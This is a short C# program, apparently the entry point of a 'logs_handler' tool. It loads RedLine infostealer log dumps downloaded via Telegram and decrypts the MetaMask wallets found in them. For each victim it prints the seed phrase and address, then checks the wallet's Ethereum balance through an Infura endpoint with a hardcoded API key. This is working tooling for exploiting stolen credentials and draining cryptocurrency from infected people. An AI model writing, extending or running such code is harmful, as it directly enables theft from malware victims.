using Core.Models.Abstractions;
using Core.Models.Factories;
using logs_handler.Services;
using Nethereum.Web3;
using Splat;

Bootstrapper.Initialize();

var logsPath = "/home/f0ll/Downloads/Telegram Desktop/logs1";
var factory = Locator.Current.GetService<RedlineFactory>()!;
var logs = new List<ILog>();

// parse logs
foreach (var dir in Directory.GetDirectories(logsPath))
{ 
    logs.Add(await factory.Create(dir));
}

// decrypt auto
var meta = new MetamaskFactory();
var web = new Web3("https://mainnet.infura.io/v3/ca4c2e3bd30841eba2438047efc1887f");

var enumerable = logs.Where(x => x.HasWallets).ToList();

foreach (var log in logs)
{
    await foreach (var wallet in meta.Create(log))
    {
        Console.WriteLine(wallet.Log);
        Console.WriteLine(wallet.Mnemonic);
        Console.WriteLine(wallet.Address);
        Console.WriteLine(await web.Eth.GetBalance.SendRequestAsync(wallet.Address));
    }
}